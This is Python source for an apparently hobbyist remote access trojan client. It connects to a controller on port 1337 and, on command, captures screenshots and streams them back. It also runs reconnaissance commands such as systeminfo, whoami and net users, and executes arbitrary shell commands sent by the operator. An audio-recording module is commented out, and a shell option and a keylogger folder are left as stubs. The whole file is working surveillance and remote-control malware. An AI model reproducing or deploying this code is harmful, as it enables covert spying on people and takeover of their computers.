# Modules
import pyautogui
import os
import calendar
import time

class Screenshots:

    def __init__(self):
        self = self

    def take_and_save(self, nt):
        s = pyautogui.screenshot() # Take screenshot
        path = os.getcwd() # Get location Path
        directory = "\captures\\" # Custom directory
        ts = path+directory+str(calendar.timegm(time.gmtime())) # Get timesmap for naming the images
        ts +=".png"
        s.save(ts) # Save images
        self.sendFile(ts, nt)
        return "taked\r\n"

    # used to send files
    def sendFile(self, ts, nt):
        filename = ts # timestamp file
        f = open(ts, "rb") # open the file
        l = f.read(1024) # read the file
        while (l):
            nt.connectionSend(l) # send the content of the file
            l = f.read(1024) # read more data
        f.close() # close the file
        nt.connectionClose() # close the connection

import os

class Configuration:

    def __init__(self):
        self.checkPaths()

    def checkPaths(self):
        path = os.getcwd()
        directory = "\captures"
        if(os.path.isdir(path+directory)):
            print("Ready to work")
        else:
            print("Creating paths")
            self.createPaths(path, directory)

    def createPaths(self, path, directory):
        paths = ["screnshots", "audio", "keylogger"]
        os.mkdir(path+directory)
        self.checkPaths()

# import os
# import sounddevice as sd
# from scipy.io.wavfile import write
# from pydub import AudioSegment
# import calendar
# import time


# #import soundcard as sc
# #import numpy

# class Audio:

#     def __init__(self):
#         self = self

#     def start_recording_audio(self, nt):
#         fs = 44100  # Sample rate
#         seconds = 10  # Duration of recording
#         recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) # Start recording
#         sd.wait()  # Wait until recording is finished
#         path = os.getcwd() # Get location Path
#         directory = "\captures\\" # Costom directory
#         print(path)
#         ts = path+'\\'+str(calendar.timegm(time.gmtime())) # Get timesmap for naming the images
#         print(ts)
#         write('data.wav', fs, recording)  # Save as WAV file
#         self.sendFile(ts, nt)

#         return "Recording audio for 10 seconds\r\n"
#         #write(str(ts), fs, recording)  # Save as WAV file

#         # used to send files
#     def sendFile(self, ts, nt):
#         filename = "data.wav" # timestamp file
#         f = open(ts, "rb") # open the file
#         l = f.read(1024) # read the file
#         while (l):
#             nt.connectionSend(l) # send the content of the file
#             l = f.read(1024) # read more data
#         f.close() # close the file
#         nt.connectionClose() # close the connection



#     def start_recording_audio_not_tested(self):
#         fs = 44100  # Sample rate
#         seconds = 10  # Duration of recording
#         recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) # Start recording
#         sd.wait()  # Wait until recording is finished
#         path = os.getcwd() # Get location Path
#         directory = "\captures\\" # Custom directory
#         ts = path+directory+str(calendar.timegm(time.gmtime())) # Get timesmap for naming the images
#         write(ts+'.wav', fs, recording)  # Save as WAV file
        
#         # sound = AudioSegment.from_wav(ts)
#         # sound.export(ts+'.mp3', format='mp3')

import os
import re
import subprocess

class CodeExecution:

    def __init__(self, nt):
        self = self
        self.nt = nt

    def dir(self):
        cmd = "dir"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data
    
    def systeminfo(self):
        cmd = "systeminfo"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def whoami(self):
        cmd = "whoami"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def net_users(self):
        cmd = "net users"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def net_localgroups(self):
        cmd = "net localgroups"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data
    
    def custom(self):
        self.nt.connectionSend("Insert your command: ".encode("utf-8"))
        cmd = str(self.nt.connectionRecv())
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        
        if not data:
            return "\r\nSyntax error\r\n"
        return data

    def get_shell(self):
        return "Shell goes here....."

    def code_execution(self):
        options_list = ["2. dir", "3. systeminfo", "4. whoami", "5. net users", "6. net localgroup", "7. custom", "8. get a shell"]
        data = ""
        for item in options_list:
            print(item)
            data += item+"\r\n"
        self.nt.connectionSend("Getting RCE...".encode("utf-8"))
        self.nt.connectionSend(data.encode("utf-8"))
        option = int(self.nt.connectionRecv())

        if(option == 1):
            self.nt.connectionClose()

        switcher = {
            2: self.dir,
            3: self.systeminfo,
            4: self.whoami,
            5: self.net_users,
            6: self.net_localgroups,
            7: self.custom
        }
        callback = switcher.get(option, "Invalid option")
        return callback()

import socket
import time

class Network():

    def __init__(self):
        self = self
        # Creating a socket object
        self.sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Set host IP and port
        self.host = socket.gethostname()
        self.port = 1337
        # self.sc.listen()
        # Receive no more than 1024 bytes
        # connection to hostname on port
        try:
            self.sc.connect((self.host, self.port))
        except (socket.error):
            print("No available to connect")

    def connectionRecv(self):
        try:
            msg = self.sc.recv(1024)
            #self.sc.close()
            return msg.decode("ascii")
        except (socket.error):
            print("No available to connect")

    def connectionSend(self, data):
        try: 
            self.sc.send(data)
        except (socket.error, OSError):
            print("No available to connect")

    def connectionClose(self):
        print("Connection lost")
        self.sc.close()
        time.sleep(1)

# Objects initialization
screen = Screenshots()
config = Configuration()
#recording_audio = Audio()
nt = Network()
rce = CodeExecution(nt)

# Options list
options_list = ["1. Screenshot", "2. Record Audio", "3. RCE", "4. Print text"]

# Functions (switch list)
def screenshot():
    msg = screen.take_and_save(nt)
    nt.connectionSend(msg.encode("ascii"))

def record_audio():
    #msg = recording_audio.start_recording_audio(nt)
    nt.connectionSend("This should work, but I have a problem with my machine but the code should work with out problems".encode("utf-8"))

def code_execution():
    msg = rce.code_execution()
    nt.connectionSend(msg.encode("utf-8"))

def selection_menu(option):
    switcher = {
        1: screenshot,
        2: record_audio,
        3: code_execution
    }
    callback = switcher.get(option, "Invalid option")
    return callback()

# Main function
def main():
    msg = "Ready\r\n"
    nt.connectionSend(msg.encode("utf-8"))    
    while True:
        msg = ''
        try:
            for item in options_list:
                print(item)
                msg += item+'\r\n'
            nt.connectionSend(msg.encode("utf-8"))
            selection_menu(int(nt.connectionRecv()))
        except (RuntimeError, TypeError, NameError, ValueError, OSError):
            nt.connectionClose()
            nt.__init__()
            nt.connectionSend("Reconnecting...".encode("utf-8"))
            print("Not a valid option")

if __name__== "__main__":
    main()